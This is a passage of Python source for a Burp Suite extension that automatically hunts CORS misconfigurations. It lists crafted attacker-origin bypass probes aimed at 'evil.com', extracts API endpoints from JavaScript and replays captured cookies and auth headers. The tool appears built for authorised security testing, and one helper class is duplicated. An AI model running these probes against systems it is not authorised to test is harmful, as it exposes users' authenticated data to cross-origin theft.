# -*- coding: utf-8 -*-
#
# CORS Auto-Hunter  --  Burp Suite extension (Jython 2.7)
# ============================================================================
# Real-time, hands-off CORS misconfiguration hunter with a full UI modelled on
# the "Universal Injection Suite" layout:
#
#   +--------------------------------------+----------------------------------+
#   |  HTTP HISTORY                        |  SCAN SETTINGS                   |
#   |  # Method URL InjectionTarget Status |  START STOP RESUME PAUSE         |
#   |  (live, colour-coded rows)           |  Requests/min  Request limit     |
#   |                                      |  Attacker domain  toggles        |
#   +----------------+---------------------+----------------------------------+
#   | Orig Req | Orig Resp | Tested Req |  |  CORS FINDINGS                   |
#   | Tested Resp | Diff (Orig vs Tested)|  |  (severity-coloured + PoC)       |
#   +--------------------------------------+----------------------------------+
#
# Every probe maps to a technique extracted from the cors.rar corpus
# (PortSwigger, HackTricks, and ~40 bug-bounty write-ups).
#
# Load:  Extender > Extensions > Add > type Python > this file
#        (needs a Jython 2.7 standalone JAR set in Extender > Options).
#
# Authorised testing only.
# ============================================================================

from burp import (IBurpExtender, ITab, IHttpListener, IContextMenuFactory,
                  IMessageEditorController, IExtensionStateListener)
from javax.swing import (JPanel, JButton, JLabel, JTextField, JCheckBox, JTable,
                         JScrollPane, JSplitPane, JTextArea, JTabbedPane,
                         BoxLayout, JMenuItem, BorderFactory, SwingUtilities,
                         Box)
from javax.swing.table import (AbstractTableModel, DefaultTableCellRenderer)
from javax.swing.event import ListSelectionListener
from javax.swing.border import EmptyBorder
from java.awt import (BorderLayout, FlowLayout, Dimension, Font, Color,
                      GridBagLayout, GridBagConstraints, Component)
from java.util import ArrayList
from java.lang import Runnable
import threading
import time
import re

EXT_NAME = "CORS Auto-Hunter"

# ---- palette (dark, like the screenshot) -----------------------------------
BG_DARK    = Color(0x1e, 0x22, 0x2a)
BG_PANEL   = Color(0x26, 0x2b, 0x34)
BG_HEADER  = Color(0x2f, 0x6f, 0xa8)
FG_LIGHT   = Color(0xe6, 0xe6, 0xe6)
FG_MUTED   = Color(0xa0, 0xa8, 0xb4)
C_SCANNING = Color(0xe0, 0xc0, 0x40)
C_VULN     = Color(0xff, 0x5a, 0x5a)
C_COMPLETE = Color(0x5a, 0xd0, 0x7a)
C_BLOCKED  = Color(0xff, 0x9a, 0x3a)
C_QUEUED   = Color(0x8a, 0x92, 0xa0)

SEV_COLORS = {
    "HIGH":   C_VULN,
    "MEDIUM": C_BLOCKED,
    "LOW":    C_SCANNING,
    "INFO":   C_QUEUED,
}

# ============================================================================
#  Technique definitions  (engine — every extracted technique)
# ============================================================================
SPECIAL_CHARS = [
    "!", "\"", "$", "%", "&", "'", "(", ")", "*", "+", ",", "-", ";",
    "=", "^", "`", "{", "|", "}", "~", "_",
    "%0b", "%60", "%00", "%09", "%0d", "%0a", "%7f",
]


def _root_domain(host):
    parts = host.split(".")
    if len(parts) >= 2:
        return ".".join(parts[-2:])
    return host


def build_techniques(scheme, host, evil):
    t = []
    root = _root_domain(host)

    def add(tid, name, origin, kind):
        t.append({"id": tid, "name": name, "origin": origin, "kind": kind})

    add("R1", "Reflect arbitrary HTTPS origin", "https://%s" % evil, "reflect")
    add("R2", "Reflect arbitrary HTTP origin",  "http://%s" % evil,  "reflect")
    add("R3", "Whitelisted null origin",        "null",              "null")
    add("P1", "Prefix match (target.evil)",  "https://%s.%s" % (host, evil), "reflect")
    add("P3", "Substring in query",          "https://%s?%s" % (evil, host), "reflect")
    add("P4", "Substring in fragment",       "https://%s#%s" % (evil, host), "reflect")
    add("S1", "Suffix match, missing dot",   "https://%s%s" % (host.split(".")[0], evil), "reflect")
    add("S2", "Suffix match, no boundary",   "https://not%s" % host, "reflect")
    add("S3", "Prefix-anchored regex bypass","https://%s.%s" % (evil.split(".")[0], host), "reflect")
    add("D1", "root-domain.evil",            "https://%s.%s" % (root, evil), "reflect")
    add("D2", "evil embedding root",         "https://%s-%s" % (root.split(".")[0], evil), "reflect")
    for i, c in enumerate(SPECIAL_CHARS):
        add("C%d" % i, "Special char '%s'" % c,
            "https://%s%s.%s" % (host, c, evil), "reflect")
    add("U1", "Underscore trusted domain",   "https://attacker_%s" % root, "reflect")
    add("I1", "Insecure HTTP of target",     "http://%s" % host, "reflect")
    add("I2", "Insecure HTTP subdomain",     "http://sub.%s" % host, "reflect")
    return t


# ============================================================================
#  JS endpoint extraction  (mine URLs/paths out of JavaScript bodies)
# ============================================================================
_RE_FETCH   = re.compile(r"""fetch\s*\(\s*['"`]([^'"`]+)['"`]""")
_RE_XHR     = re.compile(r"""\.open\s*\(\s*['"`][A-Za-z]+['"`]\s*,\s*['"`]([^'"`]+)['"`]""")
_RE_AXIOS   = re.compile(r"""axios\s*\.\s*(?:get|post|put|delete|patch)\s*\(\s*['"`]([^'"`]+)['"`]""")
_RE_AJAXURL = re.compile(r"""url\s*:\s*['"`]([^'"`]+)['"`]""")
_RE_ABSURL  = re.compile(r"""['"`](https?://[^'"`\s\\]+)['"`]""")
_RE_RELPATH = re.compile(
    r"""['"`](/(?:api|v\d+|rest|graphql|gql|account|users?|admin|internal|"""
    r"""auth|oauth|token|session|wallet|billing|payment|profile|me|data|"""
    r"""private|secret|export|download|settings?)[A-Za-z0-9_\-/.?=&%]*)['"`]""",
    re.I)
_ASSET_EXT  = re.compile(
    r"\.(png|jpe?g|gif|svg|webp|ico|css|scss|less|woff2?|ttf|otf|eot|"
    r"mp4|webm|mp3|wav|pdf|zip|gz|map)(\?|#|$)", re.I)


def extract_js_endpoints(js_text, max_items=200):
    """Return a de-duplicated list of raw endpoint strings found in JS."""
    found = []
    seen = set()
    def push(s):
        s = s.strip()
        if not s:
            return
        # Cut at the first template placeholder / string-concatenation artifact
        # so "/api/user/${id}/x" becomes the probeable prefix "/api/user".
        for marker in ("${", "'+", '"+', "`+", "+'", '+"', "' +", '" +'):
            i = s.find(marker)
            if i != -1:
                s = s[:i]
        s = s.rstrip()
        # trim a dangling partial segment left by the cut
        if s.endswith("/") and len(s) > 1:
            s = s.rstrip("/")
        if not s or s in seen:
            return
        # ignore obvious template noise and pure asset refs
        if _ASSET_EXT.search(s):
            return
        if s.startswith("data:") or s.startswith("mailto:") or s.startswith("#"):
            return
        # after cleanup, require it still looks like a path or URL
        if not (s.startswith("/") or s.startswith("http://")
                or s.startswith("https://") or s.startswith("//")):
            return
        seen.add(s)
        found.append(s)
    for rx in (_RE_FETCH, _RE_XHR, _RE_AXIOS, _RE_AJAXURL):
        for m in rx.findall(js_text):
            push(m)
            if len(found) >= max_items:
                return found
    for m in _RE_ABSURL.findall(js_text):
        push(m)
        if len(found) >= max_items:
            return found
    for m in _RE_RELPATH.findall(js_text):
        push(m)
        if len(found) >= max_items:
            return found
    return found


def _reg_domain(host):
    parts = (host or "").split(".")
    if len(parts) >= 2:
        return ".".join(parts[-2:])
    return host or ""


# ============================================================================
#  HTTP History table model  (top-left panel)
# ============================================================================
class HistoryModel(AbstractTableModel):
    COLS = ["#", "Method", "URL", "Injection Target", "Status"]

    def __init__(self):
        self._rows = []
        self._lock = threading.Lock()

    def getRowCount(self):
        return len(self._rows)

    def getColumnCount(self):
        return len(self.COLS)

    def getColumnName(self, c):
        return self.COLS[c]

    def getValueAt(self, r, c):
        row = self._rows[r]
        return [str(row["n"]), row["method"], row["url"],
                row["target"], row["status"]][c]

    def isCellEditable(self, r, c):
        return False

    def add_row(self, row):
        with self._lock:
            row["n"] = len(self._rows) + 1
            self._rows.append(row)
            idx = len(self._rows) - 1
        SwingUtilities.invokeLater(_RowInserted(self, idx))
        return idx

    def update_status(self, idx, status, target=None):
        with self._lock:
            if 0 <= idx < len(self._rows):
                self._rows[idx]["status"] = status
                if target is not None:
                    self._rows[idx]["target"] = target
        SwingUtilities.invokeLater(_RowUpdated(self, idx))

    def get(self, r):
        if 0 <= r < len(self._rows):
            return self._rows[r]
        return None

    def clear(self):
        with self._lock:
            n = len(self._rows)
            self._rows = []
        if n:
            SwingUtilities.invokeLater(_TableChanged(self))


# ============================================================================
#  Findings table model  (bottom-right panel)
# ============================================================================
class FindingsModel(AbstractTableModel):
    COLS = ["#", "Severity", "Host", "Technique", "Origin sent", "ACAO", "ACAC"]

    def __init__(self):
        self._rows = []
        self._lock = threading.Lock()

    def getRowCount(self):
        return len(self._rows)

    def getColumnCount(self):
        return len(self.COLS)

    def getColumnName(self, c):
        return self.COLS[c]

    def getValueAt(self, r, c):
        row = self._rows[r]
        return [str(r + 1), row["sev"], row["host"], row["tname"],
                row["origin"], row["acao"], row["acac"]][c]

    def isCellEditable(self, r, c):
        return False

    def add(self, row):
        with self._lock:
            self._rows.append(row)
            idx = len(self._rows) - 1
        SwingUtilities.invokeLater(_RowInserted(self, idx))

    def get(self, r):
        if 0 <= r < len(self._rows):
            return self._rows[r]
        return None

    def clear(self):
        with self._lock:
            n = len(self._rows)
            self._rows = []
        if n:
            SwingUtilities.invokeLater(_TableChanged(self))


class ProbesModel(AbstractTableModel):
    # Shows every technique probe applied to the currently-selected endpoint.
    COLS = ["#", "Technique", "Origin sent", "ACAO returned", "ACAC"]

    def __init__(self):
        self._rows = []   # list of probe dicts

    def getRowCount(self):
        return len(self._rows)

    def getColumnCount(self):
        return len(self.COLS)

    def getColumnName(self, c):
        return self.COLS[c]

    def getValueAt(self, r, c):
        p = self._rows[r]
        acao = p.get("acao")
        acao_disp = acao if acao is not None else "(none)"
        return [str(r + 1),
                "%s %s" % (p.get("tid", ""), p.get("name", "")),
                p.get("origin", ""),
                acao_disp,
                p.get("acac", "-")][c]

    def isCellEditable(self, r, c):
        return False

    def set_rows(self, rows):
        self._rows = list(rows) if rows else []
        SwingUtilities.invokeLater(_TableChanged(self))

    def get(self, r):
        if 0 <= r < len(self._rows):
            return self._rows[r]
        return None


class _RowInserted(Runnable):
    def __init__(self, m, i):
        self.m = m; self.i = i
    def run(self):
        self.m.fireTableRowsInserted(self.i, self.i)


class _RowUpdated(Runnable):
    def __init__(self, m, i):
        self.m = m; self.i = i
    def run(self):
        self.m.fireTableRowsUpdated(self.i, self.i)
class _RowUpdated(Runnable):
    def __init__(self, m, i):
        self.m = m; self.i = i
    def run(self):
        self.m.fireTableRowsUpdated(self.i, self.i)


class _TableChanged(Runnable):
    def __init__(self, m):
        self.m = m
    def run(self):
        self.m.fireTableDataChanged()


class _Append(Runnable):
    def __init__(self, area, text):
        self.area = area; self.text = text
    def run(self):
        self.area.append(self.text)
        self.area.setCaretPosition(self.area.getDocument().getLength())


class _SetText(Runnable):
    def __init__(self, comp, text):
        self.comp = comp; self.text = text
    def run(self):
        self.comp.setText(self.text)


# ============================================================================
#  Cell renderers
# ============================================================================
class StatusRenderer(DefaultTableCellRenderer):
    def getTableCellRendererComponent(self, table, value, isSelected,
                                       hasFocus, row, col):
        c = DefaultTableCellRenderer.getTableCellRendererComponent(
            self, table, value, isSelected, hasFocus, row, col)
        c.setBackground(BG_HEADER if isSelected else BG_PANEL)
        text = "%s" % value
        low = text.lower()
        color = FG_LIGHT
        if "scan" in low:
            color = C_SCANNING
        elif "vulner" in low or "high" in low:
            color = C_VULN
        elif "complete" in low or "done" in low:
            color = C_COMPLETE
        elif "block" in low or "medium" in low:
            color = C_BLOCKED
        elif "queue" in low or "info" in low or "low" in low:
            color = C_QUEUED
        c.setForeground(color)
        c.setFont(Font("Dialog", Font.BOLD, 12))
        return c


class SeverityRenderer(DefaultTableCellRenderer):
    def getTableCellRendererComponent(self, table, value, isSelected,
                                       hasFocus, row, col):
        c = DefaultTableCellRenderer.getTableCellRendererComponent(
            self, table, value, isSelected, hasFocus, row, col)
        c.setBackground(BG_HEADER if isSelected else BG_PANEL)
        c.setForeground(SEV_COLORS.get("%s" % value, FG_LIGHT))
        c.setFont(Font("Dialog", Font.BOLD, 12))
        return c


class PlainDarkRenderer(DefaultTableCellRenderer):
    def getTableCellRendererComponent(self, table, value, isSelected,
                                       hasFocus, row, col):
        c = DefaultTableCellRenderer.getTableCellRendererComponent(
            self, table, value, isSelected, hasFocus, row, col)
        c.setBackground(BG_HEADER if isSelected else BG_PANEL)
        c.setForeground(FG_LIGHT)
        return c


class TargetRenderer(DefaultTableCellRenderer):
    def getTableCellRendererComponent(self, table, value, isSelected,
                                       hasFocus, row, col):
        c = DefaultTableCellRenderer.getTableCellRendererComponent(
            self, table, value, isSelected, hasFocus, row, col)
        c.setBackground(BG_HEADER if isSelected else BG_PANEL)
        text = "%s" % value
        if "JS_EXTRACTED" in text:
            c.setForeground(Color(0x5d, 0xca, 0xa5))   # teal/cyan
        elif text and text[:2] in ("R1", "R2", "R3", "P1", "P3", "P4",
                                    "S1", "S2", "S3", "D1", "D2", "U1",
                                    "I1", "I2", "PF") or text.startswith("C"):
            c.setForeground(C_VULN)
        else:
            c.setForeground(FG_MUTED)
        return c


# ============================================================================
#  Token-bucket rate limiter
# ============================================================================
class RateLimiter(object):
    def __init__(self, per_minute):
        self.set_rate(per_minute)
        self._lock = threading.Lock()
        self._allowance = float(self._rate) if self._rate > 0 else 0.0
        self._last = time.time()

    def set_rate(self, per_minute):
        self._rate = max(0, int(per_minute))

    def acquire(self):
        if self._rate <= 0:
            return
        sleep_for = 0.0
        with self._lock:
            now = time.time()
            elapsed = now - self._last
            self._last = now
            self._allowance += elapsed * (self._rate / 60.0)
            if self._allowance > self._rate:
                self._allowance = float(self._rate)
            if self._allowance < 1.0:
                sleep_for = (1.0 - self._allowance) * (60.0 / self._rate)
                self._allowance = 0.0
            else:
                self._allowance -= 1.0
        # sleep OUTSIDE the lock so other threads aren't blocked for the
        # whole wait; they'll compute their own budget when they acquire.
        if sleep_for > 0:
            time.sleep(sleep_for)


# ============================================================================
#  Main extension
# ============================================================================
class BurpExtender(IBurpExtender, ITab, IHttpListener, IContextMenuFactory,
                   IMessageEditorController, IExtensionStateListener):

    def registerExtenderCallbacks(self, callbacks):
        self._cb = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName(EXT_NAME)

        # Capture TOOL_PROXY once so the hot-path listener never re-imports.
        # If this fails we default to a safe sentinel that makes us react
        # ONLY when the flag matches, preventing any self-request feedback loop.
        try:
            from burp import IBurpExtenderCallbacks as _CB
            self._TOOL_PROXY = _CB.TOOL_PROXY
        except Exception:
            self._TOOL_PROXY = 4  # documented constant value for TOOL_PROXY

        self._state = "STOPPED"
        self._pause_event = threading.Event(); self._pause_event.set()
        self._stop_flag = threading.Event()
        self._queue = []
        self._queue_lock = threading.Lock()
        self._seen = set()
        self._seen_lock = threading.Lock()
        self._finding_keys = set()
        # Cache of auth headers (Cookie/Authorization) seen per host, so that
        # synthetic JS-extracted requests to the same host can be sent
        # authenticated — otherwise credentialed-CORS findings are missed.
        self._host_auth = {}
        self._host_auth_lock = threading.Lock()
        self._diag = {"scope": 0, "getonly": 0, "ws": 0, "dupe": 0, "queued": 0, "err": 0}
        self._sent_count = 0
        self._count_lock = threading.Lock()
        self._worker_lock = threading.Lock()

        self._limiter = RateLimiter(120)
        self._hist = HistoryModel()
        self._findings = FindingsModel()

        self._cur_service = None
        self._cur_request = None
        self._cur_response = None
        self._cur_hist_row = None

        self._build_ui()

        callbacks.registerHttpListener(self)
        callbacks.registerContextMenuFactory(self)
        callbacks.registerExtensionStateListener(self)
        callbacks.addSuiteTab(self)

        self._start_poller()

        self._log("Loaded. Set attacker domain then press START.")

    # ---- UI helpers ---------------------------------------------------------
    def _title(self, text):
        lbl = JLabel(" " + text)
        lbl.setOpaque(True)
        lbl.setBackground(BG_HEADER)
        lbl.setForeground(Color.WHITE)
        lbl.setFont(Font("Dialog", Font.BOLD, 13))
        lbl.setBorder(EmptyBorder(4, 6, 4, 6))
        return lbl

    def _mk_area(self):
        a = JTextArea()
        a.setEditable(False)
        a.setBackground(BG_DARK)
        a.setForeground(FG_LIGHT)
        a.setFont(Font("Monospaced", Font.PLAIN, 12))
        a.setLineWrap(False)
        return a

    def _mk_btn(self, text, handler, accent):
        b = JButton(text, actionPerformed=handler)
        b.setPreferredSize(Dimension(120, 30))
        b.setForeground(Color.WHITE if accent else FG_LIGHT)
        b.setBackground(accent if accent else BG_HEADER)
        b.setFont(Font("Dialog", Font.BOLD, 12))
        b.setFocusPainted(False)
        return b

    def _style_table(self, table):
        table.setSelectionMode(0)
        table.setBackground(BG_PANEL)
        table.setForeground(FG_LIGHT)
        table.setGridColor(Color(0x3a, 0x40, 0x4a))
        table.setRowHeight(22)
        table.setDefaultRenderer(table.getColumnClass(0), PlainDarkRenderer())
        try:
            hdr = table.getTableHeader()
            hdr.setBackground(BG_HEADER)
            hdr.setForeground(Color.WHITE)
            hdr.setFont(Font("Dialog", Font.BOLD, 12))
        except Exception:
            pass

    def _build_ui(self):
        self._panel = JPanel(BorderLayout())
        self._panel.setBackground(BG_DARK)

        # TOP-LEFT: HTTP HISTORY
        hist_panel = JPanel(BorderLayout())
        hist_panel.setBackground(BG_PANEL)
        hist_panel.add(self._title("HTTP HISTORY"), BorderLayout.NORTH)
        self._hist_table = JTable(self._hist)
        self._style_table(self._hist_table)
        self._hist_table.getSelectionModel().addListSelectionListener(
            _HistSelListener(self))
        try:
            cm = self._hist_table.getColumnModel()
            cm.getColumn(0).setPreferredWidth(30)
            cm.getColumn(1).setPreferredWidth(55)
            cm.getColumn(2).setPreferredWidth(340)
            cm.getColumn(3).setPreferredWidth(120)
            cm.getColumn(3).setCellRenderer(TargetRenderer())
            cm.getColumn(4).setPreferredWidth(120)
            cm.getColumn(4).setCellRenderer(StatusRenderer())
        except Exception:
            pass
        hist_panel.add(JScrollPane(self._hist_table), BorderLayout.CENTER)

        # TOP-RIGHT: SETTINGS
        settings = self._build_settings_panel()

        top_split = JSplitPane(JSplitPane.HORIZONTAL_SPLIT, hist_panel, settings)
        top_split.setResizeWeight(0.72)
        top_split.setDividerLocation(760)

        # BOTTOM-LEFT: REQ/RESP TABS
        self._tabs = JTabbedPane()
        self._ta_oreq  = self._mk_area()
        self._ta_oresp = self._mk_area()
        self._ta_treq  = self._mk_area()
        self._ta_tresp = self._mk_area()
        self._diff_pane = self._build_diff_pane()

        # probes table: every technique applied to the selected endpoint
        self._probes = ProbesModel()
        self._probes_table = JTable(self._probes)
        self._style_table(self._probes_table)
        self._probes_table.getSelectionModel().addListSelectionListener(
            _ProbeSelListener(self))
        try:
            pcm = self._probes_table.getColumnModel()
            pcm.getColumn(0).setPreferredWidth(30)
            pcm.getColumn(1).setPreferredWidth(190)
            pcm.getColumn(2).setPreferredWidth(220)
            pcm.getColumn(3).setPreferredWidth(200)
            pcm.getColumn(4).setPreferredWidth(50)
        except Exception:
            pass

        self._tabs.addTab("Techniques applied (all probes)", JScrollPane(self._probes_table))
        self._tabs.addTab("Original Req",   JScrollPane(self._ta_oreq))
        self._tabs.addTab("Original Resp",  JScrollPane(self._ta_oresp))
        self._tabs.addTab("Tested Req (Payload)", JScrollPane(self._ta_treq))
        self._tabs.addTab("Tested Resp",    JScrollPane(self._ta_tresp))
        self._tabs.addTab("Diff (Original vs Tested)", self._diff_pane)
        self._tabs.setSelectedIndex(0)

        # BOTTOM-RIGHT: FINDINGS
        find_panel = JPanel(BorderLayout())
        find_panel.setBackground(BG_PANEL)
        find_panel.add(self._title("CORS FINDINGS"), BorderLayout.NORTH)
        self._find_table = JTable(self._findings)
        self._style_table(self._find_table)
        self._find_table.getSelectionModel().addListSelectionListener(
            _FindSelListener(self))
        try:
            cm = self._find_table.getColumnModel()
            cm.getColumn(0).setPreferredWidth(28)
            cm.getColumn(1).setPreferredWidth(64)
            cm.getColumn(1).setCellRenderer(SeverityRenderer())
            cm.getColumn(2).setPreferredWidth(120)
            cm.getColumn(3).setPreferredWidth(150)
            cm.getColumn(4).setPreferredWidth(160)
        except Exception:
            pass
        self._poc_area = self._mk_area()
        find_split = JSplitPane(JSplitPane.VERTICAL_SPLIT,
                                JScrollPane(self._find_table),
                                JScrollPane(self._poc_area))
        find_split.setResizeWeight(0.55)
        find_split.setDividerLocation(150)
        find_panel.add(find_split, BorderLayout.CENTER)

        bottom_split = JSplitPane(JSplitPane.HORIZONTAL_SPLIT,
                                  self._tabs, find_panel)
        bottom_split.setResizeWeight(0.62)
        bottom_split.setDividerLocation(640)

        main_split = JSplitPane(JSplitPane.VERTICAL_SPLIT, top_split, bottom_split)
        main_split.setResizeWeight(0.5)
        main_split.setDividerLocation(300)
        self._panel.add(main_split, BorderLayout.CENTER)

        # LOG
        self._logarea = JTextArea(4, 100)
        self._logarea.setEditable(False)
        self._logarea.setBackground(BG_DARK)
        self._logarea.setForeground(FG_MUTED)
        self._logarea.setFont(Font("Monospaced", Font.PLAIN, 11))
        log_scroll = JScrollPane(self._logarea)
        log_scroll.setBorder(BorderFactory.createTitledBorder("Log"))
        self._panel.add(log_scroll, BorderLayout.SOUTH)

    def _build_settings_panel(self):
        outer = JPanel(BorderLayout())
        outer.setBackground(BG_PANEL)
        outer.add(self._title("SCAN SETTINGS & CONTROLS"), BorderLayout.NORTH)

        body = JPanel()
        body.setBackground(BG_PANEL)
        body.setLayout(BoxLayout(body, BoxLayout.Y_AXIS))
        body.setBorder(EmptyBorder(6, 8, 6, 8))

        lbl_c = JLabel("Scan Controls  \u25CF")
        lbl_c.setForeground(C_COMPLETE)
        lbl_c.setFont(Font("Dialog", Font.BOLD, 12))
        lbl_c.setAlignmentX(Component.LEFT_ALIGNMENT)
        body.add(lbl_c)
        body.add(Box.createVerticalStrut(4))

        btn_row1 = JPanel(FlowLayout(FlowLayout.LEFT, 6, 2))
        btn_row1.setBackground(BG_PANEL)
        self._btn_start  = self._mk_btn("\u25B6 START", self._on_start, C_COMPLETE)
        self._btn_stop   = self._mk_btn("\u25A0 STOP", self._on_stop, C_VULN)
        btn_row1.add(self._btn_start)
        btn_row1.add(self._btn_stop)
        btn_row1.setAlignmentX(Component.LEFT_ALIGNMENT)
        body.add(btn_row1)

        btn_row2 = JPanel(FlowLayout(FlowLayout.LEFT, 6, 2))
        btn_row2.setBackground(BG_PANEL)
        self._btn_resume = self._mk_btn("\u25B6 RESUME", self._on_resume, None)
        self._btn_pause  = self._mk_btn("\u2759\u2759 PAUSE", self._on_pause, None)
        btn_row2.add(self._btn_resume)
        btn_row2.add(self._btn_pause)
        btn_row2.setAlignmentX(Component.LEFT_ALIGNMENT)
        body.add(btn_row2)

        self._lbl_state = JLabel("State: STOPPED")
        self._lbl_state.setForeground(FG_LIGHT)
        self._lbl_state.setFont(Font("Dialog", Font.BOLD, 12))
        self._lbl_state.setAlignmentX(Component.LEFT_ALIGNMENT)
        body.add(self._lbl_state)
        body.add(Box.createVerticalStrut(8))

        sep1 = JLabel("REQUEST LIMITS")
        sep1.setForeground(FG_MUTED); sep1.setFont(Font("Dialog", Font.BOLD, 11))
        sep1.setAlignmentX(Component.LEFT_ALIGNMENT)
        body.add(sep1)

        rpm_row = JPanel(FlowLayout(FlowLayout.LEFT, 6, 2))
        rpm_row.setBackground(BG_PANEL)
        l1 = JLabel("Requests/minute (0=\u221E):"); l1.setForeground(FG_LIGHT)
        rpm_row.add(l1)
        self._tf_rpm = JTextField("120", 5)
        rpm_row.add(self._tf_rpm)
        rpm_row.setAlignmentX(Component.LEFT_ALIGNMENT)
        body.add(rpm_row)

        lim_row = JPanel(FlowLayout(FlowLayout.LEFT, 6, 2))
        lim_row.setBackground(BG_PANEL)
        l2 = JLabel("Request total limit (0=\u221E):"); l2.setForeground(FG_LIGHT)
        lim_row.add(l2)
        self._tf_limit = JTextField("5000", 6)
        lim_row.add(self._tf_limit)
        lim_row.setAlignmentX(Component.LEFT_ALIGNMENT)
        body.add(lim_row)
        body.add(Box.createVerticalStrut(8))

        sep2 = JLabel("CUSTOM ATTACKER DOMAIN")
        sep2.setForeground(FG_MUTED); sep2.setFont(Font("Dialog", Font.BOLD, 11))
        sep2.setAlignmentX(Component.LEFT_ALIGNMENT)
        body.add(sep2)
        dom_row = JPanel(FlowLayout(FlowLayout.LEFT, 6, 2))
        dom_row.setBackground(BG_PANEL)
        l3 = JLabel("Domain:"); l3.setForeground(FG_LIGHT)
        dom_row.add(l3)
        self._tf_evil = JTextField("evil.com", 16)
        dom_row.add(self._tf_evil)
        dom_row.setAlignmentX(Component.LEFT_ALIGNMENT)
        body.add(dom_row)
        body.add(Box.createVerticalStrut(8))

        self._cb_scope = JCheckBox("Only in-scope targets", True)
        self._cb_preflight = JCheckBox("Also probe pre-flight (OPTIONS)", True)
        self._cb_getonly = JCheckBox("Skip non-GET requests", False)
        self._cb_jsextract = JCheckBox("Extract endpoints from JS files", True)
        self._cb_jssamedomain = JCheckBox("   \u2514 JS endpoints: same domain only", True)
        for cb in (self._cb_scope, self._cb_preflight, self._cb_getonly,
                   self._cb_jsextract, self._cb_jssamedomain):
            cb.setBackground(BG_PANEL); cb.setForeground(FG_LIGHT)
            cb.setAlignmentX(Component.LEFT_ALIGNMENT)
            body.add(cb)

        body.add(Box.createVerticalStrut(6))
        self._btn_clear = self._mk_btn("Clear all", self._on_clear, None)
        self._btn_clear.setAlignmentX(Component.LEFT_ALIGNMENT)
        body.add(self._btn_clear)

        self._btn_import = self._mk_btn("Import Proxy History", self._on_import_history, None)
        self._btn_import.setPreferredSize(Dimension(180, 30))
        self._btn_import.setAlignmentX(Component.LEFT_ALIGNMENT)
        body.add(Box.createVerticalStrut(4))
        body.add(self._btn_import)

        self._cb_autopoll = JCheckBox("Auto-watch history (poll every 3s)", True)
        self._cb_autopoll.setBackground(BG_PANEL); self._cb_autopoll.setForeground(FG_LIGHT)
        self._cb_autopoll.setAlignmentX(Component.LEFT_ALIGNMENT)
        body.add(self._cb_autopoll)

        self._cb_verbose = JCheckBox("Verbose log (show every technique sent)", True)
        self._cb_verbose.setBackground(BG_PANEL); self._cb_verbose.setForeground(FG_LIGHT)
        self._cb_verbose.setAlignmentX(Component.LEFT_ALIGNMENT)
        body.add(self._cb_verbose)

        self._lbl_stats = JLabel("probes: 0   findings: 0   queue: 0")
        self._lbl_stats.setForeground(FG_MUTED)
        self._lbl_stats.setAlignmentX(Component.LEFT_ALIGNMENT)
        body.add(Box.createVerticalStrut(6))
        body.add(self._lbl_stats)

        outer.add(JScrollPane(body), BorderLayout.CENTER)
        return outer

    def _build_diff_pane(self):
        p = JPanel(GridBagLayout())
        p.setBackground(BG_DARK)
        gc = GridBagConstraints()
        gc.fill = GridBagConstraints.BOTH
        gc.weightx = 0.5; gc.weighty = 1.0
        gc.gridx = 0; gc.gridy = 0
        self._diff_left = self._mk_area()
        self._diff_left.setFont(Font("Monospaced", Font.PLAIN, 11))
        p.add(JScrollPane(self._diff_left), gc)
        gc.gridx = 1
        self._diff_right = self._mk_area()
        self._diff_right.setFont(Font("Monospaced", Font.PLAIN, 11))
        p.add(JScrollPane(self._diff_right), gc)
        return p

    # ---- ITab ---------------------------------------------------------------
    def getTabCaption(self):
        return EXT_NAME

    def getUiComponent(self):
        return self._panel

    # ---- IMessageEditorController -------------------------------------------
    def getHttpService(self):
        return self._cur_service

    def getRequest(self):
        return self._cur_request

    def getResponse(self):
        return self._cur_response

    # ---- IExtensionStateListener --------------------------------------------
    def extensionUnloaded(self):
        # Stop the worker cleanly so no orphaned thread survives a reload and
        # keeps firing HTTP requests. Daemon status only covers Burp exit.
        try:
            self._stop_flag.set()
            self._pause_event.set()
            if getattr(self, "_poller_stop", None) is not None:
                self._poller_stop.set()
            with self._queue_lock:
                self._queue = []
        except Exception:
            pass

    # ---- logging ------------------------------------------------------------
    def _log(self, msg):
        stamp = time.strftime("%H:%M:%S")
        SwingUtilities.invokeLater(_Append(self._logarea, "[%s] %s\n" % (stamp, msg)))

    def _refresh_stats(self):
        with self._queue_lock:
            q = len(self._queue)
        txt = "probes: %d   findings: %d   queue: %d" % (
            self._sent_count, self._findings.getRowCount(), q)
        SwingUtilities.invokeLater(_SetText(self._lbl_stats, txt))

    def _set_state(self, s):
        self._state = s
        SwingUtilities.invokeLater(_SetText(self._lbl_state, "State: " + s))

    # ---- buttons ------------------------------------------------------------
    def _on_start(self, ev):
        if self._state == "RUNNING":
            return
        if self._state == "PAUSED":
            return self._on_resume(ev)
        self._stop_flag.clear()
        self._pause_event.set()
        try:
            self._limiter.set_rate(int(self._tf_rpm.getText().strip() or "0"))
        except Exception:
            self._limiter.set_rate(0)
        self._set_state("RUNNING")
        self._log("Started. Attacker domain = %s" % self._tf_evil.getText().strip())
        self._ensure_worker()

    def _ensure_worker(self):
        # Start the worker thread only if one isn't already alive. Prevents
        # duplicate workers (and the resulting rate-limit bypass / counter
        # race) when Start and 'scan this now' interleave with Stop.
        with self._worker_lock:
            w = getattr(self, "_worker", None)
            alive = False
            try:
                alive = w is not None and w.isAlive()
            except Exception:
                try:
                    alive = w is not None and w.is_alive()
                except Exception:
                    alive = False
            if alive:
                return
            self._worker = threading.Thread(target=self._run_worker)
            self._worker.setDaemon(True)
            self._worker.start()

    def _on_pause(self, ev):
        if self._state == "RUNNING":
            self._pause_event.clear()
            self._set_state("PAUSED")
            self._log("Paused.")

    def _on_resume(self, ev):
        if self._state == "PAUSED":
            self._pause_event.set()
            self._set_state("RUNNING")
            self._log("Resumed.")

    def _on_stop(self, ev):
        if self._state == "STOPPED":
            return
        self._stop_flag.set()
        self._pause_event.set()
        self._set_state("STOPPED")
        # Drain any pending queue so a later Start doesn't silently resume
        # old work. Mark still-queued history rows so the UI isn't misleading.
        drained = []
        with self._queue_lock:
            drained = self._queue
            self._queue = []
        for it in drained:
            hidx = it.get("hidx", -1)
            if hidx >= 0:
                self._hist.update_status(hidx, "Stopped")
        self._refresh_stats()
        self._log("Stopped. Cleared %d pending item(s)." % len(drained))

    def _on_clear(self, ev):
        self._findings.clear()
        self._hist.clear()
        self._probes.set_rows([])
        self._cur_hist_row = None
        self._poc_area.setText("")
